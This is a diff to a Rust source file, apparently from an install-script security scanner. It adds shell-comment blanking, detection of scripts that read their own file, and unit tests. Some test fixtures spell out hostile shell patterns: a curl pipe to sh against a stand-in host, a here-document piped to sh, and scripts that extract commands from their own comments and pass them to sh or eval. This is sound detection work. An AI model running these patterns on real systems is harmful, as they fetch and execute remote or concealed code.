@@ -1398,6 +1398,372 @@ pub fn hook_command_risk(p: &Pack, cmd: &[u32], output_kept: bool) -> Vec<PyStr>
     reasons
 }
 
+// ---------------- a shell script's comments (SH-COMMENT-FP, 0.1.9) ----------------
+
+/// A space, a tab or a carriage return: what ends a word on a line.
+fn sh_blank(ch: u32) -> bool {
+    ch == c(' ') || ch == c('\t') || ch == c('\r')
+}
+
+/// The index of the `"` that closes a double-quoted string whose text starts at text[i] (a substitution in it
+/// read to its end), else None.
+fn sh_dquote_end(text: &[u32], mut i: usize) -> Option<usize> {
+    let n = text.len();
+    while i < n {
+        let ch = text[i];
+        if ch == c('\\') {
+            i += 2;
+        } else if ch == c('"') {
+            return Some(i);
+        } else if ch == c('$') && text.get(i + 1) == Some(&c('(')) {
+            let j = sh_subst_end(text, i + 2);
+            if j >= n {
+                return None;
+            }
+            i = j + 1;
+        } else if ch == c('`') {
+            let j = sh_tick_end(text, i + 1);
+            if j >= n {
+                return None;
+            }
+            i = j + 1;
+        } else {
+            i += 1;
+        }
+    }
+    None
+}
+
+/// The index after the `))` that closes the arithmetic `((` at text[i], else None.
+fn sh_arith_end(text: &[u32], mut i: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    while i < text.len() {
+        if text[i] == c('(') {
+            depth += 1;
+        } else if text[i] == c(')') {
+            depth -= 1;
+            if depth == 0 {
+                return Some(i + 1);
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+/// A here-document's delimiter after its `<<` (text[i] is the character after it): (the word, its quotes
+/// removed; whether `<<-` strips the body's leading tabs; the index after the word), else None.
+fn sh_here_word(text: &[u32], mut i: usize) -> Option<(PyStr, bool, usize)> {
+    let n = text.len();
+    let tabs = text.get(i) == Some(&c('-'));
+    if tabs {
+        i += 1;
+    }
+    while i < n && sh_blank(text[i]) {
+        i += 1;
+    }
+    let mut word: PyStr = Vec::new();
+    while i < n {
+        let ch = text[i];
+        if sh_blank(ch) || [c('\n'), c(';'), c('&'), c('|'), c('('), c(')'), c('<'), c('>')].contains(&ch) {
+            break;
+        }
+        if ch == c('\'') || ch == c('"') {
+            let j = pystr::find_char(text, ch, i + 1)?;
+            word.extend_from_slice(&text[i + 1..j]);
+            i = j + 1;
+        } else if ch == c('\\') {
+            word.extend_from_slice(pystr::sub(text, i + 1, i + 2));
+            i += 2;
+        } else {
+            word.push(ch);
+            i += 1;
+        }
+    }
+    if word.is_empty() {
+        None
+    } else {
+        Some((word, tabs, i))
+    }
+}
+
+/// The index after a here-document's body that starts at text[i], ended by a line that is `word` (its leading
+/// tabs stripped for `<<-`, a carriage return at its end aside), else None.
+fn sh_here_end(text: &[u32], mut i: usize, word: &[u32], tabs: bool) -> Option<usize> {
+    let n = text.len();
+    loop {
+        let end = pystr::find_char(text, c('\n'), i).unwrap_or(n);
+        let mut line = &text[i..end];
+        if tabs {
+            let k = line.iter().position(|&x| x != c('\t')).unwrap_or(line.len());
+            line = &line[k..];
+        }
+        if line.last() == Some(&c('\r')) {
+            line = &line[..line.len() - 1];
+        }
+        if line == word {
+            return Some((end + 1).min(n));
+        }
+        if end >= n {
+            return None;
+        }
+        i = end + 1;
+    }
+}
+
+/// A shell script's text with its comments blanked (SH-COMMENT-FP, 0.1.9), its offsets and lines kept: from a
+/// `#` that starts a word outside quotes, a here-document's body and arithmetic, to the end of its line, each
+/// character a space; a `#!` first line is kept. None when it blanks nothing, or when the text does not read to
+/// its end as a shell reads it (a quote, a here-document or arithmetic left open): the text is then read whole.
+pub fn sh_comments_blanked(text: &[u32]) -> Option<PyStr> {
+    let n = text.len();
+    let mut out: PyStr = text.to_vec();
+    let mut blanked = false;
+    let mut start = true; // the next character starts a word
+    let mut docs: Vec<(PyStr, bool)> = Vec::new(); // here-documents whose bodies follow this line
+    let mut i = if pystr::starts_with(text, "#!") { pystr::find_char(text, c('\n'), 0).unwrap_or(n) } else { 0 };
+    while i < n {
+        let ch = text[i];
+        if ch == c('\n') {
+            i += 1;
+            for (word, tabs) in std::mem::take(&mut docs) {
+                i = sh_here_end(text, i, &word, tabs)?;
+            }
+            start = true;
+        } else if sh_blank(ch) {
+            start = true;
+            i += 1;
+        } else if ch == c('#') && start {
+            let end = pystr::find_char(text, c('\n'), i).unwrap_or(n);
+            for x in &mut out[i..end] {
+                *x = c(' ');
+            }
+            blanked = true;
+            i = end;
+        } else if ch == c('\\') {
+            if text.get(i + 1) != Some(&c('\n')) {
+                start = false; // (a line continuation leaves it as it was)
+            }
+            i += 2;
+        } else if ch == c('\'') {
+            i = pystr::find_char(text, c('\''), i + 1)? + 1;
+            start = false;
+        } else if ch == c('"') {
+            i = sh_dquote_end(text, i + 1)? + 1;
+            start = false;
+        } else if ch == c('$') && text.get(i + 1) == Some(&c('\'')) {
+            // $'...': a backslash escapes the quote
+            let mut j = i + 2;
+            loop {
+                match text.get(j) {
+                    None => return None,
+                    Some(&x) if x == c('\\') => j += 2,
+                    Some(&x) if x == c('\'') => break,
+                    _ => j += 1,
+                }
+            }
+            i = j + 1;
+            start = false;
+        } else if pystr::starts_with_at(text, i, "$((") || pystr::starts_with_at(text, i, "((") {
+            let from = if ch == c('$') { i + 1 } else { i };
+            i = sh_arith_end(text, from)?;
+            start = false;
+        } else if pystr::starts_with_at(text, i, "<<") && !pystr::starts_with_at(text, i, "<<<") {
+            let (word, tabs, j) = sh_here_word(text, i + 2)?;
+            docs.push((word, tabs));
+            i = j;
+            start = false;
+        } else {
+            start = [c(';'), c('&'), c('|'), c('('), c(')'), c('<'), c('>'), c('`')].contains(&ch);
+            i += 1;
+        }
+    }
+    if blanked && docs.is_empty() {
+        Some(out)
+    } else {
+        None
+    }
+}
+
+/// Whether a word names the script's own file outside its substitutions: `$0`, `${0…}`, `$BASH_SOURCE`,
+/// `$ZSH_ARGZERO` (in braces or not), or a variable of `names` (assigned one of them).
+fn sh_self_word(word: &[u32], names: &[PyStr]) -> bool {
+    let n = word.len();
+    let ident = |x: u32| x == c('_') || (x < 128 && (x as u8 as char).is_ascii_alphanumeric());
+    let mut i = 0usize;
+    while i < n {
+        if pystr::starts_with_at(word, i, "$(") {
+            i = sh_subst_end(word, i + 2) + 1;
+            continue;
+        }
+        if word[i] == c('`') {
+            i = sh_tick_end(word, i + 1) + 1;
+            continue;
+        }
+        if word[i] == c('$') {
+            let mut j = i + 1;
+            if word.get(j) == Some(&c('{')) {
+                j += 1;
+            }
+            if word.get(j) == Some(&c('0')) {
+                return true;
+            }
+            let k = (j..n).find(|&k| !ident(word[k])).unwrap_or(n);
+            let name = &word[j..k];
+            if is(name, "BASH_SOURCE") || is(name, "ZSH_ARGZERO") || in_set(names, name) {
+                return true;
+            }
+            i = k.max(i + 1);
+            continue;
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Whether an assignment's value is the script's own path: the name itself, or a substitution that resolves it
+/// (_SH_SELF_RESOLVERS: realpath, readlink, basename).
+fn sh_self_value(p: &Pack, value: &[u32], subs: &[PyStr], names: &[PyStr]) -> bool {
+    if sh_self_word(value, names) {
+        return true;
+    }
+    let resolvers = p.strs("_SH_SELF_RESOLVERS");
+    subs.iter().any(|sub| {
+        sh_parse(p, sub).iter().any(|cmd| {
+            let (at, name, _) = sh_program(p, cmd);
+            at.is_some_and(|k| in_set(resolvers, &name) && cmd.words[k + 1..].iter().any(|w| sh_self_word(w, names)))
+        })
+    })
+}
+
+fn sh_reads_own(p: &Pack, text: &[u32], names: &mut Vec<PyStr>, depth: usize) -> bool {
+    if depth > p.usize("_SH_SELF_MAX_DEPTH") {
+        return true;
+    }
+    let tools = p.strs("_SH_SELF_PATH_TOOLS");
+    let env_assign = p.re("_ENV_ASSIGN_RE");
+    for cmd in sh_parse(p, text) {
+        for (k, word) in cmd.words.iter().enumerate() {
+            if let Some(m) = env_assign.match_(word) {
+                let name = &word[..m.end() - 1];
+                if !in_set(names, name) && sh_self_value(p, &word[m.end()..], &cmd.subs[k], names) {
+                    names.push(name.to_vec());
+                }
+            }
+            if cmd.subs[k].iter().any(|sub| sh_reads_own(p, sub, names, depth + 1)) {
+                return true;
+            }
+        }
+        let (at, name, _) = sh_program(p, &cmd);
+        if let Some(k) = at {
+            if !in_set(tools, &name) && cmd.words[k + 1..].iter().any(|w| env_assign.match_(w).is_none() && sh_self_word(w, names)) {
+                return true;
+            }
+        }
+        if cmd.redirs.iter().any(|(op, target)| (is(op, "<") || is(op, "<>")) && sh_self_word(target, names)) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Whether a shell script's commands read its own file (SH-COMMENT-FP, 0.1.9): the file (`$0`, `$BASH_SOURCE`,
+/// `$ZSH_ARGZERO`, a variable assigned one of them or what resolves it) given to a program that is not one the
+/// pack lists as only naming a path (_SH_SELF_PATH_TOOLS: dirname, echo, a shell run on it again), or read on
+/// standard input. Such a script's comments may be what it runs.
+pub fn sh_reads_own_file(p: &Pack, text: &[u32]) -> bool {
+    let mut names: Vec<PyStr> = Vec::new();
+    sh_reads_own(p, text, &mut names, 0)
+}
+
+/// What the install-script test reads of a shell script (SH-COMMENT-FP, 0.1.9): its text with its comments
+/// blanked, which no shell runs. None (the text read whole, as before): not a shell script (with a `#!` line,
+/// one that names no shell; without, a file the caller gives a language, or one that reads as code), no
+/// comment, a text that does not read to its end, or a script that reads its own file.
+pub fn script_without_comments(p: &Pack, text: &[u32], lang: Option<&str>) -> Option<PyStr> {
+    if !(pystr::starts_with(text, "#!") || lang.is_none()) || !shell_text(p, text) {
+        return None;
+    }
+    let bare = sh_comments_blanked(text)?;
+    if sh_reads_own_file(p, &bare) {
+        return None;
+    }
+    Some(bare)
+}
+
+#[cfg(test)]
+mod comment_tests {
+    use super::*;
+
+    fn blanked(text: &str) -> Option<String> {
+        sh_comments_blanked(&u(text)).map(|b| b.iter().filter_map(|&x| char::from_u32(x)).collect())
+    }
+
+    fn reads_own(text: &str) -> bool {
+        let p = crate::pack::current();
+        sh_reads_own_file(&p, &u(text))
+    }
+
+    #[test]
+    fn a_comment_is_blanked_its_line_and_offsets_kept() {
+        let comment = "# a `curl x | sh` it replaced";
+        assert_eq!(blanked(&format!("#!/bin/sh\n{comment}\necho hi # done\n")),
+                   Some(format!("#!/bin/sh\n{}\necho hi{}\n", " ".repeat(comment.len()), " ".repeat(7))));
+        assert_eq!(blanked("a;# x\nb|#y\n(#z\n").as_deref(), Some("a;   \nb|  \n(  \n"));
+        assert_eq!(blanked("f() { # x\n  :\n}\n").as_deref(), Some("f() {    \n  :\n}\n"));
+        assert_eq!(blanked("echo a \\\n# x\n").as_deref(), Some("echo a \\\n   \n"));     // (a line continuation)
+    }
+
+    #[test]
+    fn a_hash_that_starts_no_word_is_not_a_comment() {
+        for text in [
+            "#!/bin/sh\necho ok\n",                                   // the #! line alone
+            "echo ${#arr[@]} $# ${x#y} ${x##*/} a#b\n",                // parameters, a word's #
+            "echo '# x' \"# y\" $'# z\\'' \\# w\n",                     // quoted, escaped
+            "echo $((16#ff)) ; ((x = 2#10))\n",                        // arithmetic
+            "[[ $x =~ ^#[0-9]+$ ]] && curl -s http://x.invalid/a#b | sh\n",
+            "cat <<EOF\n# kept: a here-document's body\nEOF\n",
+            "cat <<-'END' | sh\n\t# kept\n\tEND\n",
+            "x=\"$(echo \"# not a comment\")\"\n",
+        ] {
+            assert_eq!(blanked(text), None, "{}", text);
+        }
+    }
+
+    #[test]
+    fn a_text_that_does_not_read_to_its_end_is_read_whole() {
+        for text in ["# x\necho 'open\n", "# x\ncat <<EOF\nbody\n", "# x\necho \"open\n", "# x\necho $((1 +\n"] {
+            assert_eq!(blanked(text), None, "{}", text);
+        }
+        assert_eq!(blanked("cat <<A <<B\n# a\nA\n# b\nB\n# c\n").as_deref(), Some("cat <<A <<B\n# a\nA\n# b\nB\n   \n"));
+    }
+
+    #[test]
+    fn a_script_that_reads_its_own_file() {
+        for text in [
+            "sed -n 's/^#//p' \"$0\" | sh\n",
+            "tail -n +5 \"${BASH_SOURCE[0]}\" | bash\n",
+            "while read -r l; do eval \"$l\"; done < \"$0\"\n",
+            "eval \"$(grep '^#X' $0 | cut -c3-)\"\n",
+            "SELF=$(readlink -f \"$0\")\nawk 'NR>9' \"$SELF\" | sh\n",
+            "export ME=\"$0\"; cat \"$ME\"\n",
+            "x=$(< \"$0\")\n",
+        ] {
+            assert!(reads_own(text), "{}", text);
+        }
+        for text in [
+            "PROJECT_DIR=\"$(cd \"$(dirname \"$0\")/../..\" && pwd)\"\n. \"$PROJECT_DIR/lib.sh\"\n",
+            "echo \"usage: $0 [-h]\" >&2; exit 2\n",
+            "DIR=$(dirname \"${BASH_SOURCE[0]}\"); bash \"$DIR/x.sh\"\n",
+            "exec \"$0\" --child \"$@\"\n",
+            "case \"$0\" in *bash) : ;; esac; [ -x \"$0\" ] && sudo \"$0\"\n",
+            "printf '%s\\n' '$0' | cat\n",
+        ] {
+            assert!(!reads_own(text), "{}", text);
+        }
+    }
+}
+
 #[cfg(test)]
 mod piped_run_tests {
     use super::*;
